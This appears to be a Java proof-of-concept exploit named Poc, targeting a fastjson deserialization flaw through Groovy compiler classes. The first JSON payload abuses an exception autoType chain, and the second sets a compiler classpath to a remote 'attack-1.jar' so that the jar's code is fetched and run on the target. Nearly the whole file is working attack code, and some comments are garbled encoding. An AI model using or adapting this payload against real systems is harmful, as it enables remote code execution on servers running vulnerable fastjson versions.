import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.deserializer.FieldDeserializer;
import org.codehaus.groovy.control.CompilationFailedException;
import org.codehaus.groovy.control.ProcessingUnit;
import org.codehaus.groovy.tools.javac.JavaStubCompilationUnit;
import org.codehaus.groovy.control.CompilerConfiguration;
import groovy.grape.GrabAnnotationTransformation;
//import org.eclipse.jdt.internal.core.BasicCompilationUnit;
//import or;

public class Poc {


    public static void main(String[] args) {
        String json ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{\n" +
                "  }\n" +
                "}";

        try {
            // �����л���org.codehaus.groovy.control.ProcessingUnit ���������
            JSON.parse(json);
        } catch (Exception e) {
            //e.printStackTrace();
        }

        json =
                "{\n" +
                        "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                        "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                        "  \"config\":{\n" +
                        "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                        "    \"classpathList\":[\"http://127.0.0.1:8433/attack-1.jar\"]\n" +
                        "  },\n" +
                        "  \"gcl\":null,\n" +
                        "  \"destDir\": \"/tmp\"\n" +
                        "}";
        // �����л���ִ��
        JSONObject.parse(json);


    }
}